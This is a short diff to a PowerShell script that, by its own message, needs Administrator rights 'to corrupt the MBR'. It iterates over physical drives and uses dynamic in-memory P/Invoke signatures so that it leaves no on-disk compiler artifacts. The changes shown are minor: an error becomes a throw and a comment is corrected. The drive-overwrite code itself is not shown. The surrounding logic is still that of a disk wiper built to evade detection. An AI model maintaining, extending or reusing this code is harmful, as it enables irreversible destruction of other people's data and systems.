@@ -2,8 +2,7 @@
 $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object Security.Principal.WindowsPrincipal($identity)
 if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "This script must be run as Admin to corrupt the MBR."
-    return
+    throw "This script must be run as Admin to corrupt the MBR."
 }
 
 # Get all physical drives using CIM
@@ -47,7 +46,7 @@ foreach ($drive in $drives) {
     }
 }
 
-# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevents on-disk artifacts
+# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevent on-disk artifacts
 if ($mbrOverwritten) {
 
     $asmName = New-Object Reflection.AssemblyName "DInvoke"
